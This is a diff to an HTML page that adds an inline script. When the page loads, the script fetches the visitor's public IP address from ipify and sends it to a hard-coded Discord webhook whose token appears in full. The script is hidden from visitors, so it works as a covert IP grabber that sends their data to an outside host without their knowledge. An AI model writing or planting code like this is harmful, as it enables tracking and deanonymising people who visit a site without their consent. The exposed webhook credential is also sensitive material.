@@ -59,10 +59,15 @@
 <!-- partial -->
   <script  src="./script.js"></script>
   <script>
-    var ip = document.getElementById('ip').value;
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://discord.com/api/webhooks/1192627897907814500/hqy2JISR_v2MHkp58ZGujUW7qF4JW32lTJbXFlSRPvJ-KiaPaOFZQxtYohbJchB4Iqxc' + ip, true);
-    xhr.send();
+    var ip;
+    fetch('https://api64.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        ip = data.ip;
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://discord.com/api/webhooks/1192627897907814500/hqy2JISR_v2MHkp58ZGujUW7qF4JW32lTJbXFlSRPvJ-KiaPaOFZQxtYohbJchB4Iqxc' + ip, true);
+        xhr.send();
+    });
 </script>
 </body>
 </html>
